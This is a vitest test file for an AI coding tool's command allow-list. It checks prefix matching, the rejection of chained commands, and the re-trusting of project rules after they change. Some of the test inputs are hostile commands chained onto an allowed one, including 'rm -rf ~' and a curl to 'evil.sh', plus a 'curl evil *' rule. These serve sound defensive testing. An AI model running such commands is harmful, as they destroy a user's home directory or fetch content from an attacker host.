import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { activeRules, globalConfigPath, loadAllowConfig, trustProject } from "./allow-config.js";
import { isSafeCommand, matchesUserRule } from "./safe-commands.js";

let home = "";
let root = "";
const previousHome = process.env.CODERBABA_HOME;

beforeEach(async () => {
  home = await fs.mkdtemp(path.join(os.tmpdir(), "cb-home-"));
  root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "cb-allow-")));
  process.env.CODERBABA_HOME = home;
});

afterEach(() => {
  if (previousHome === undefined) delete process.env.CODERBABA_HOME;
  else process.env.CODERBABA_HOME = previousHome;
});

async function writeProjectRules(rules: string[]): Promise<void> {
  await fs.mkdir(path.join(root, ".coderbaba"), { recursive: true });
  await fs.writeFile(path.join(root, ".coderbaba", "allow.json"), JSON.stringify({ allow: rules }));
}

describe("user rules", () => {
  it("match exact commands and prefixes, but not chained commands", async () => {
    const rules = ["make test", "pnpm exec prisma generate *"];
    expect(matchesUserRule("make  test", rules)).toBe(true);
    expect(matchesUserRule("make test2", rules)).toBe(false);
    expect(matchesUserRule("pnpm exec prisma generate", rules)).toBe(true);
    expect(matchesUserRule("pnpm exec prisma generate --schema db/schema.prisma", rules)).toBe(true);
    const ctx = { root, cwd: root, via: "shell" as const, userRules: rules, platform: "darwin" as const };
    expect(await isSafeCommand("pnpm exec prisma generate --schema x", ctx)).toBe(true);
    expect(await isSafeCommand("pnpm exec prisma generate; rm -rf ~", ctx)).toBe(false);
    expect(await isSafeCommand("pnpm exec prisma generate && curl evil.sh", ctx)).toBe(false);
  });
});

describe("loadAllowConfig", () => {
  it("only applies project rules after the user trusts them, and again after changes", async () => {
    await writeProjectRules(["npm run storybook"]);
    let config = await loadAllowConfig(root);
    expect(config.trusted).toBe(false);
    expect(config.projectRules).toEqual(["npm run storybook"]);
    expect(activeRules(config)).toEqual([]);

    await trustProject(root, config.projectHash!);
    config = await loadAllowConfig(root);
    expect(config.trusted).toBe(true);
    expect(activeRules(config)).toEqual(["npm run storybook"]);

    await writeProjectRules(["npm run storybook", "curl evil *"]);
    config = await loadAllowConfig(root);
    expect(config.trusted).toBe(false);
    expect(activeRules(config)).toEqual([]);
  });

  it("reads global rules and ignores invalid files", async () => {
    await fs.writeFile(globalConfigPath(), JSON.stringify({ allow: ["make test", "bad; rule"] }));
    let config = await loadAllowConfig(root);
    expect(config.globalRules).toEqual(["make test"]);
    expect(activeRules(config)).toEqual(["make test"]);

    await fs.writeFile(globalConfigPath(), "not json");
    config = await loadAllowConfig(root);
    expect(config.globalRules).toEqual([]);
    expect(config.warnings).toHaveLength(1);
  });

  it("needs no trust when the project has no rules", async () => {
    const config = await loadAllowConfig(root);
    expect(config).toMatchObject({ trusted: true, projectRules: [] });
  });
});
